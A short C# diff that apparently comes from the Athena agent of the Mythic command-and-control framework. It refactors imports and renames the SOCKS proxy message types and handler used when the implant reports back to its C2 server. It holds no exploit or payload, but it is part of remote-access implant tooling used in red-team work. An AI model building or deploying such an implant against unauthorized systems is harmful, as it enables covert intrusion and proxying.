@@ -1,8 +1,7 @@
 ﻿using Athena.Commands;
 using Athena.Models.Config;
-using Athena.Models.Athena.Commands;
+using Athena.Models.Commands;
 using Athena.Models.Mythic.Checkin;
-using Athena.Models.Mythic.Response;
 using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
 using System.Collections.Concurrent;
@@ -16,6 +15,7 @@ using System.Security.Principal;
 using System.Text;
 using System.Text.Json;
 using Athena.Models.Comms.SMB;
+using Athena.Models.Proxy;
 
 namespace Athena
 {
@@ -82,12 +82,12 @@ namespace Athena
             {
                 Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                 Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
-                Task<List<SocksMessage>> socksTask = SocksResponseHandler.GetSocksMessagesAsync();
+                Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
                 await Task.WhenAll(responseTask, delegateTask, socksTask);
 
                 List<string> responses = responseTask.Result;
                 List<DelegateMessage> delegateMessages = delegateTask.Result;
-                List<SocksMessage> socksMessages = socksTask.Result;
+                List<MythicDatagram> socksMessages = socksTask.Result;
 
                 if (responses.Count > 0 || delegateMessages.Count > 0 || socksMessages.Count > 0)
                 {
